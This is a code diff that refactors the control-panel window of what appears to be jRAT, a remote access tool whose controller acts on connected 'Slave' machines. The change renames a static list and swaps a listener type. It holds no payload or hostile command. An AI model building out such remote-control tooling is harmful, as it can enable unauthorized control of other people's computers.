@@ -1,6 +1,10 @@
 package jrat.controller.ui.frames;
 
 import jrat.api.*;
+import jrat.api.ui.ControlPanel;
+import jrat.api.ui.ControlPanelAction;
+import jrat.api.ui.ControlPanelItem;
+import jrat.api.ui.ControlPanelTab;
 import jrat.controller.Slave;
 import jrat.controller.listeners.Performable;
 import jrat.controller.ui.components.DisabledDefaultMutableTreeNode;
@@ -99,7 +103,7 @@ public class FrameControlPanel extends BaseFrame implements TreeSelectionListene
 	public void addTabs(String currentLabel) {
         tabbedPane.removeAll();
 
-        for (ControlPanelItem item : ControlPanel.items) {
+        for (ControlPanelItem item : ControlPanel.ITEMS) {
             if (item.category.text.equals(currentLabel) && item instanceof ControlPanelTab) {
                 tabbedPane.addTab(item.text, item.icon, (JPanel) item.getAction());
             }
@@ -111,7 +115,7 @@ public class FrameControlPanel extends BaseFrame implements TreeSelectionListene
      * @param n master tree node
      */
 	public void addNodes(DefaultMutableTreeNode n) {
-	    for (ControlPanelItem item : ControlPanel.items) {
+	    for (ControlPanelItem item : ControlPanel.ITEMS) {
 	        DefaultMutableTreeNode parent;
 
 	        // if not category node has been created, create it and add it to the parent
@@ -136,14 +140,14 @@ public class FrameControlPanel extends BaseFrame implements TreeSelectionListene
 
             //boolean disabled = e.getPath().getLastPathComponent() instanceof DisabledDefaultMutableTreeNode;
 
-            for (ControlPanelItem item : ControlPanel.items) {
+            for (ControlPanelItem item : ControlPanel.ITEMS) {
                 if (item.text.equals(what)) {
                     if (item instanceof ControlPanelTab) {
                         JPanel p = (JPanel) item.getAction();
                         tabbedPane.setSelectedComponent(p);
                     } else if (item instanceof ControlPanelAction) {
-                        ControlPanelListener listener = (ControlPanelListener) item.getAction();
-                        listener.onClick(getSlave());
+                        ClientEventListener listener = (ClientEventListener) item.getAction();
+                        listener.emit(getSlave());
                     }
                 }
             }
